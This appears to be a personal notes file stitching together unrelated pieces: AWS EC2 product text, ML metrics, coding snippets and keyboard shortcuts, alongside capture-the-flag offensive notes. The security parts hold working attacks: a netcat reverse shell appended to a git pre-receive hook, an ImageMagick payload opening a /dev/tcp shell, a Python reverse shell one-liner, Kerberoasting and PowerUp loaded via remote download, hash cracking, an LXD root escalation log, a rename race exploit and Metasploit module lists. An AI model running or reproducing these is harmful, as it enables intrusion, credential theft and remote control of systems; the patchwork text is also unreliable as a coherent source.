With T2 Unlimited enabled, the t2.small instance can burst above the baseline even after its CPU Credit balance is drawn down to zero. For a vast majority of general purpose workloads where the average CPU utilization is at or below the baseline performance, the basic hourly price for t2.small covers all CPU bursts. If the instance happens to run at an average 25% CPU utilization (5% above baseline) over a period of 24 hours after its CPU Credit balance is drawn to zero, it will be charged an additional 6 cents (5 cents/vCPU-hour x 1 vCPU x 5% x 24 hours).

Many applications such as web servers, developer environments and small databases don’t need consistently high levels of CPU, but benefit significantly from having full access to very fast CPUs when they need them. T instances are engineered specifically for these use cases. If you need consistently high CPU performance for applications such as video encoding, high volume websites or HPC applications, we recommend you use Fixed Performance Instances. T instances are designed to perform as if they have dedicated high speed Intel cores available when your application really needs CPU performance, while protecting you from the variable performance or other common side-effects you might typically see from over-subscription in other environments.
Multiple Storage Options
Amazon EC2 allows you to choose between multiple storage options based on your requirements. Amazon EBS is a durable, block-level storage volume that you can attach to a single, running Amazon EC2 instance. You can use Amazon EBS as a primary storage device for data that requires frequent and granular updates. For example, Amazon EBS is the recommended storage option when you run a database on Amazon EC2. Amazon EBS volumes persist independently from the running life of an Amazon EC2 instance. Once a volume is attached to an instance you can use it like any other physical hard drive. Amazon EBS provides three volume types to best meet the needs of your workloads: General Purpose (SSD), Provisioned IOPS (SSD), and Magnetic. General Purpose (SSD) is the new, SSD-backed, general purpose EBS volume type that we recommend as the default choice for customers. General Purpose (SSD) volumes are suitable for a broad range of workloads, including small to medium sized databases, development and test environments, and boot volumes. Provisioned IOPS (SSD) volumes offer storage with consistent and low-latency performance, and are designed for I/O intensive applications such as large relational or NoSQL databases. Magnetic volumes provide the lowest cost per gigabyte of all EBS volume types. Magnetic volumes are ideal for workloads where data is accessed infrequently, and applications where the lowest storage cost is important.

Many Amazon EC2 instances can also include storage from disks that are physically attached to the host computer. This disk storage is referred to as instance store. Instance store provides temporary block-level storage for Amazon EC2 instances. The data on an instance store volume persists only during the life of the associated Amazon EC2 instance.

In addition to block level storage via Amazon EBS or instance store, you can also use Amazon S3 for highly durable, highly available object storage. Learn more about Amazon EC2 storage options from the Amazon EC2 documentation.

EBS-optimized Instances
For an additional, low, hourly fee, customers can launch selected Amazon EC2 instances types as EBS-optimized instances. For M6g, M5, M4, C6g, C5, C4, R6g, P3, P2, G3, and D2 instances, this feature is enabled by default at no additional cost. EBS-optimized instances enable EC2 instances to fully use the IOPS provisioned on an EBS volume. EBS-optimized instances deliver dedicated throughput between Amazon EC2 and Amazon EBS, with options between 500 and 4,000 Megabits per second (Mbps) depending on the instance type used. The dedicated throughput minimizes contention between Amazon EBS I/O and other traffic from your EC2 instance, providing the best performance for your EBS volumes. EBS-optimized instances are designed for use with all EBS volumes. When attached to EBS-optimized instances, Provisioned IOPS volumes can achieve single digit millisecond latencies and are designed to deliver within 10% of the provisioned IOPS performance 99.9% of the time. We recommend using Provisioned IOPS volumes with EBS-optimized instances or instances that support cluster networking for applications with high storage I/O requirements.

Cluster Networking
Select EC2 instances support cluster networking when launched into a common cluster placement group. A cluster placement group provides low-latency networking between all instances in the cluster. The bandwidth an EC2 instance can utilize depends on the instance type and its networking performance specification. Inter instance traffic within the same region can utilize up to 5 Gbps for single-flow and up to 100 Gbps for multi-flow traffic in each direction (full duplex). Traffic to and from S3 buckets in the same region can also utilize all available instance aggregate bandwidth. When launched in a placement group, instances can utilize up to 10 Gbps for single-flow traffic and up to 100 Gbps for multi-flow traffic. Network traffic to the Internet is limited to 5 Gbps (full duplex). Cluster networking is ideal for high performance analytics systems and many science and engineering applications, especially those using the MPI library standard for parallel programming.

Intel Processor Features
xeon-pltnm-m-ww-rgb-60 (2)
Amazon EC2 instances that feature an Intel processor may provide access to the following processor features:

Intel AES New Instructions (AES-NI): Intel AES-NI encryption instruction set improves upon the original Advanced Encryption Standard (AES) algorithm to provide faster data protection and greater security. All current generation EC2 instances support this processor feature.
Intel Advanced Vector Extensions (Intel AVX, Intel AVX2 and Intel AVX-512): Intel AVX and Intel AVX2 are 256-bit and Intel AVX-512 is a 512-bit instruction set extensions designed for applications that are Floating Point (FP) intensive. Intel AVX instructions improve performance for applications like image and audio/video processing, scientific simulations, financial analytics, and 3D modeling and analysis. These features are only available on instances launched with HVM AMIs.
Intel Turbo Boost Technology: Intel Turbo Boost Technology provides more performance when needed. The processor is able to automatically run cores faster than the base operating frequency to help you get more done faster.
Intel Deep Learning Boost (Intel DL Boost): A new set of built-in processor technologies designed to accelerate AI deep learning use cases. The 2nd Gen Intel Xeon Scalable processors extend Intel AVX-512 with a new Vector Neural Network Instruction (VNNI/INT8) that significantly increases deep learning inference performance over previous generation Intel Xeon Scalable processors (with FP32), for image recognition/segmentation, object detection, speech recognition, language translation, recommendation systems, reinforcement learning and others. VNNI may not be compatible with all Linux distributions. Please check documentation before using. 
Not all processor features are available in all instance types, check out the instance type matrix for more detailed information on which features are available from which instance types.

Measuring Instance Performance
Why should you measure instance performance?
Amazon EC2 allows you to provision a variety of instances types, which provide different combinations of CPU, memory, disk, and networking. Launching new instances and running tests in parallel is easy, and we recommend measuring the performance of applications to identify appropriate instance types and validate application architecture. We also recommend rigorous load/scale testing to ensure that your applications can scale as you intend.
Considerations for Amazon EC2 performance evaluation
Amazon EC2 provides you with a large number of options across ten different instance types, each with one or more size options, organized into six distinct instance families optimized for different types of applications. We recommend that you assess the requirements of your applications and select the appropriate instance family as a starting point for application performance testing. You should start evaluating the performance of your applications by (a) identifying how your application needs compare to different instance families (e.g. is the application compute-bound, memory-bound, etc.?), and (b) sizing your workload to identify the appropriate instance size. There is no substitute for measuring the performance of your full application since application performance can be impacted by the underlying infrastructure or by software and architectural limitations. We recommend application-level testing, including the use of application profiling and load testing tools and services. For more information, open a support case and ask for additional network performance specifications for the specific instance types that you are interested in.




https://www.longdom.org/articles-images/information-technology-software-engineering-theoretical-research-model-9-256-g001.png




NTLM hash in python 

import hashlib,binascii
hash = hashlib.new('md4', "thisismyhashvalue".encode('utf-16le')).digest()
print binascii.hexlify(hash)


prince password generation 

pp64.bin --pw-min=8 < dict.txt | head -20 shuf dict.txt | pp64.bin --pw-min=8 | head -20

purple rain 

shuf dict.txt | pp64.bin --pw-min=8 | hashcat -a 0 -m #type -w 4 -O hashes.txt -g 300000


Lets first enumerate Windows. If we run setspn -T medin -Q ​ */* we can extract all accounts in the SPN.

SPN is the Service Principal Name, and is the mapping between service and account.

Running that command, we find an existing SPN. What user is that for?

setspn -T medin -Q */*


Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.

Lets first get the Powershell Invoke-Kerberoast script.

iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')


Now lets load this into memory: Invoke-Kerberoast -OutputFormat hashcat ​ |fl


Lets use hashcat to bruteforce this password. The type of hash we’re cracking is Kerberos 5 TGS-REP etype 23 and the hashcat code for this is 13100.

hashcat -m 13100 -​a 0 hash.txt wordlist --force

Crack the hash. What is the users password in plain text?

We will run PowerUp.ps1 for the enumeration.

Lets load PowerUp1.ps1 into memory.

iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')


The script has identified several ways to get Administrator access. The first being to bypassUAC and the second is UnattendedPath. We will be exploiting the UnattendPath way.

“Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode.” Read more about it here.

It is also where users passwords are stored in base64. Navigate to C:\Windows\Panther\Unattend\Unattended.xml.



Now we have the Administrator’s password, login as them and obtain the last flag.

When you will connect as administrator, you will be prompted to change the password. Make sure you set up a strong password, else you’ll have to type the password again :).

The flag is on the desktop:

Answer: THM{g00d_j0b_SYS4DM1n_M4s73R}




understanding usefull metrics

False negatives and false positives are samples that were incorrectly classified
True negatives and true positives are samples that were correctly classified
Accuracy is the percentage of examples correctly classified
true samplestotal samples 

Precision is the percentage of predicted positives that were correctly classified
true positivestrue positives + false positives 

Recall is the percentage of actual positives that were correctly classified
true positivestrue positives + false negatives 

AUC refers to the Area Under the Curve of a Receiver Operating Characteristic curve (ROC-AUC). This metric is equal to the probability that a classifier will rank a random positive sample higher than a random negative sample.
AUPRC refers to Area Under the Curve of the Precision-Recall Curve. This metric computes precision-recall pairs for different probability thresholds.





send thru CURL 

 curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
 
 
 server side filter
 <?php
    //Get the extension
    $extension = pathinfo($_FILES["fileToUpload"]["name"])["extension"];
    //Check the extension against the blacklist -- .php and .phtml
    switch($extension){
        case "php":
        case "phtml":
        case NULL:
            $uploadFail = True;
            break;
        default:
            $uploadFail = False;
    }
?>


faulty filter pseudocode used in apache2 

ACCEPT FILE FROM THE USER -- SAVE FILENAME IN VARIABLE userInput
IF STRING ".jpg" IS IN VARIABLE userInput:
    SAVE THE FILE
ELSE:
    RETURN ERROR MESSAGE
	
	the best alternative to cat 
	is TAC command(tac)
	
	
	
	
	ICACLS
	
	
	I - permission inherited from the parent container

F - full access (full control)

M - Modify right/access

OI - object inherit

IO - inherit only

CI - container inherit

RX - read and execute

AD - append data (add subdirectories)

WD - write data and add files




TRICKS 
--------------

or is addition 
and is modulo 
<< left shift is multiply by 2
>> right shift is division by 2
xor is to check equality 
to uppercase do or with underscore
to lowercase do or with space
 ~(num)+1  is 2nd complement 
~num is 1st complement
basic encryption is XOR
swap number is using XOR
find max and min by XOR
find even and odd using & operation (modulo)


privilege escalation is such a large topic that it would be impossible to do it proper justice in this type of room. However, it is a necessary topic that must be covered, so rather than making a task with questions, I shall provide you all with some resources.

General:

https://github.com/swisskyrepo/PayloadsAllTheThings (A bunch of tools and payloads for every stage of pentesting)
Linux:

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ (a bit old but still worth looking at)
https://github.com/rebootuser/LinEnum (One of the most popular priv esc scripts)
https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh (Another popular script)
https://github.com/mzet-/linux-exploit-suggester (A Script that's dedicated to searching for kernel exploits)
https://gtfobins.github.io (I can not overstate the usefulness of this for priv esc, if a common binary has special permissions, you can use this site to see how to get root perms with it.)
Windows:

https://www.fuzzysecurity.com/tutorials/16.html (Dictates some very useful commands and methods to enumerate the host and gain intel)
https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp (A bit old but still an incredibly useful script)
https://github.com/411Hall/JAWS (A general enumeration script)




fcrackzip -vbDp /usr/share/wordlists/rockyou.txt christmaslists.zip
steghide extract -sf TryHackMe.jpg


Name	Big-O
Constant	O(1)
Logarithmic	O(log(n))
Linear	O(n)
Log Linear	O(n log(n))
Quadratic	O(n^2)
Cubic	O(n^3)
Exponential	O(2^n)



if test -n "$GIT_PUSH_OPTION_COUNT"
then
	i=0
	while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"
	do
		eval "value=\$GIT_PUSH_OPTION_$i"
		case "$value" in
		echoback=*)
			echo "echo from the pre-receive-hook: ${value#*=}" >&2
			;;
		reject)
			exit 1
		esac
		i=$((i + 1))
	done
fi
mkfifo /tmp/f; nc 10.8.106.222 9001 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f



kali@kali:/data/magician/files$ cat > image.png << EOF
> push graphic-context
> encoding "UTF-8"
> viewbox 0 0 1 1
> affine 1 0 0 1 0 0
> push graphic-context
> image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/10.8.50.72/4444 0<&1 2>&1'
> pop graphic-context
> pop graphic-context
> EOF




good privilege escalation 


#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {
    int file_data; char buffer[256]; int size = 0;

    if(argc != 2) {
      printf("Binary to output the contents of credentials file \n ./readcreds [file] \n"); 
      exit(1);
    }

    if (!access(argv[1],R_OK)) {
      sleep(1);
      file_data = open(argv[1], O_RDONLY);
    } else {
      fprintf(stderr, "Cannot open %s \n", argv[1]);
      exit(1);
    }

    do {
        size = read(file_data, buffer, 256);
        write(1, buffer, size);
    } 
    
    while(size>0);

}






john@exploitable:~$ wget http://10.8.106.222/lxd-alpine-builder/alpine-v3.12-x86_64-20201014_1053.tar.gz
--2020-10-14 08:56:48--  http://10.8.106.222/lxd-alpine-builder/alpine-v3.12-x86_64-20201014_1053.tar.gz
Connecting to 10.8.106.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3183829 (3.0M) [application/gzip]
Saving to: ‘alpine-v3.12-x86_64-20201014_1053.tar.gz’

alpine-v3.12-x86_64-2 100%[========================>]   3.04M  1.04MB/s    in 2.9s

2020-10-14 08:56:51 (1.04 MB/s) - ‘alpine-v3.12-x86_64-20201014_1053.tar.gz’ saved [3183829/3183829]

john@exploitable:~$ lxc image list
+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+
john@exploitable:~$ lxc image import ./alpine-v3.12-x86_64-20201014_1053.tar.gz --alias myimage
Image imported with fingerprint: 8f83febe3dd6858c008db1d6ef7327876b93df2f5846489921dcc6
john@exploitable:~$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | 8f83febe3dd6 | no     | alpine v3.12 (20201014_10:53) | x86_64 | 3.04MB | Oct 14, 2020 at 8:58am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
john@exploitable:~$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:~$ lxc start ignite
john@exploitable:~$ lxc exec ignite /bin/bash
john@exploitable:~$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # find / -type f -name root.txt 2>/dev/null
/mnt/root/root/root.txt
~ # cat /mnt/root/root/root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88





SSL filters
SSL
ssl
ssl.alpn
ssl.cert.alg
ssl.cert.expired
ssl.cert.extension
ssl.cert.fingerprint
ssl.cert.issuer.cn
ssl.cert.pubkey.bits
ssl.cert.pubkey.type
ssl.cert.serial
ssl.cert.subject.cn
ssl.chain_count
ssl.cipher.bits
ssl.cipher.name
ssl.cipher.version
ssl.ja3s
ssl.jarm
ssl.version




Memoization 
1d, 2d, 3d
------------------------


#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
} 





onesixtyone  10.10.24.181 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt





class Solution {
    public int minJumps(int[] arr) {
        if (arr.length == 1)
            return 0;
        int count = 0;
        int length = arr.length;
        Map<Integer, List<Integer>> graph = new HashMap<>();
        // populate the graph with index
        for (int i=0; i<length; i++)
            graph.computeIfAbsent(arr[i], x->new LinkedList<>()).add(i);
        // create the boolean array visited
        boolean [] visited = new boolean [length];
        // mark the first element as visited
        visited[0] = true;
        // since we do bfs, we need a queue
        Queue<Integer> queue = new LinkedList<>();
        queue.offer(0);
        while (!queue.isEmpty()) {
            int size = queue.size();
            for (int i=size; i>0; i--) {
                int current = queue.poll();
                // if we reach the last index
                if (current == length - 1)
                    return count;
                // get the possible next values
                List<Integer> next = graph.get(arr[current]);
                // now lets add the previous, ie current-1, next ies, current + 1 into the list
                next.add(current-1);
                next.add(current+1);
                for (Integer j:next) {
                    if (j >= 0 && j<length && !visited[j]) {
                        visited[j] = true;
                        queue.offer(j);
                    }
                }
                next.clear(); 
            }
            count += 1;
        }
        return 0;
    }
}


JArray array = new JArray();
array.Add("Manual text");
array.Add(new DateTime(2000, 5, 23));

JObject o = new JObject();
o["MyArray"] = array;

string json = o.ToString();
// {
//   "MyArray": [
//     "Manual text",
//     "2000-05-23T00:00:00"
//   ]
// }





drozer 

Basic Cheatsheet of Drozer

Exploiting Content Provider

run app.provider.info -a package_name

run scanner.provider.finduris -a package_name

run app.provider.query uri

run app.provider.update uri --selection conditions selection_arg column data

run scanner.provider.sqltables -a package_name

run scanner.provider.injection -a package_name

run scanner.provider.traversal -a package_name

Exploiting Service

run app.service.info -a package_name

run app.service.start --action action --component package_name component_name

run app.service.send package_name component_name --msg what arg1 arg2 --extra type key value --bundle-as-obj






Metasploit 
-----------------

ProFPTD 
use exploit/unix/ftp/proftpd_modcopy_exec


Apache HTTP Server
-----------------------
 use exploit/multi/http/apache_mod_cgi_bash_env_exec
 
 
 Drupal 
 -----------
 use exploit/multi/http/drupal_drupageddon 
 
 
 PhpMyAdmin 
 --------------
use exploit/multi/http/phpmyadmin_preg_replace


Ruby on Rails 
----------------
 use exploit/multi/http/rails_actionpack_inline_exec
 
 CUPS 
 ---------
 use exploit/multi/http/cups_bash_env_exec
 
 
 Unreal IRCd
 --------------------
 use exploit/unix/irc/unreal_ircd_3281_backdoor
 
 
 Apache continuum 
 ----------------------
 use exploit/linux/http/apache_continuum_cmd_exec 
 
 
 Docker daemon Local Privilege escalation 
 --------------------------------------------
  use exploit/linux/local/docker_daemon_privilege_escalation
  
  
  Samba
  -----------
  use auxiliary/admin/smb/upload_file
  
  
  [ Python code used for DNS Exfiltration and Infiltration ]

I have created a few simple scripts written in Python for you to complete this walkthrough. This will allow us to make DNS queries to a remote DNS Server.
git clone https://github.com/kleosdc/dns-exfil-infil

Also, make sure you have the required Python3 modules in order to run the python code.

Use the following command to install the required modules:

sudo pip3 install -r requirements.txt

[ Program used for DNS Tunneling ]

https://github.com/yarrick/iodine

sudo apt install iodine

[ Download Wireshark ]

You may use Wireshark or tshark to capture packets. The python code uses .PCAP file to extract the captured data and then decode it.
https://www.wireshark.org/download.html

sudo apt install -y tshark



Keyboard shortcuts
------------------------

Jump Over Words
ALT + Left/Right

Go to end of line
CMD + Right

Go to beginning of line
CMD + Left

Go to the top of a file
CMD + Up

Go to the bottom of a file
CMD + Down

Select by Word
SHIFT + ALT + Left/Right

Select the rest of a line from current cursor
SHIFT + CMD + Left/Right

Select everything above/below the current cursor
SHIFT + CMD + Up/Down




python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

